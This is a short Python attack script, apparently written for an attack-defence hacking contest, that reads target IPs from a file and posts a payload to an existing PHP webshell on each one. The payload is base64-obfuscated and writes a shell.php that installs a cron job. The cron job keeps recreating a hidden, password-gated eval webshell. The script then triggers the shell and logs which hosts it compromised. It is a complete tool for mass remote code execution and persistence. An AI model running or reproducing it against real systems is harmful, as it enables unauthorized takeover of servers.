#coding=utf-8
import requests
import re
shell_addr="/info.php"
passwd="_"                    #木马密码
port="99"

payload =  {passwd: 'file_put_contents(\'shell.php\',base64_decode(\'PD9waHANCnN5c3RlbSgnZWNobyAiKiAqICogKiAqIGVjaG8gXCI8P3BocCAgaWYobWQ1KFxcXFxcXCRfR0VUW3Bhc3NdKT09XCc4MzVhZWRlY2UwYTkwZDQ1YTVjY2UzYTcyNWE4ZTk3Y1wnKXtAZXZhbChcXFxcXFwkX1BPU1RbY21kXSk7fSAgXCIgPiAvd3d3L3d3d3Jvb3QvaGVsbGxvLmNvbS8uY29uZmlnLnBocCIgfCBjcm9udGFiO3dob2FtaScpOw0KPz4=\'));'}

ippath="ip.txt"
pattern = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
iptables = ""
with open(ippath, 'r') as file_to_read:
    while True:
        lines = file_to_read.readline() 
        if not lines:
            break
            pass
        iptables+=lines  
#print(iptables)
iplist=pattern.findall(iptables)

#密码cmd-路径是config点php
#
flag=open("config_php_passwd_cmd.txt","a")

for ip in iplist:
    url="http://"+ip+":"+port+shell_addr
    #print(url)
    try:
        res=requests.post(url,payload,timeout=1)
        #print(res)
        if res.status_code == requests.codes.ok:
            result = url+" write nodie correct ,passwd is cmd path is ./config.php "
            print(result,end="")
            flag.write(ip+"\n")
        else:
            print ("shell 404")
    except Exception as e:
        print(url+" connect shell fail")
        raise e
    try:
        requests.get("http://"+ip+":"+port+"/shell.php",timeout=1)
        print("激活成功")
    except Exception as e:
        print("激活成功")

flag.close()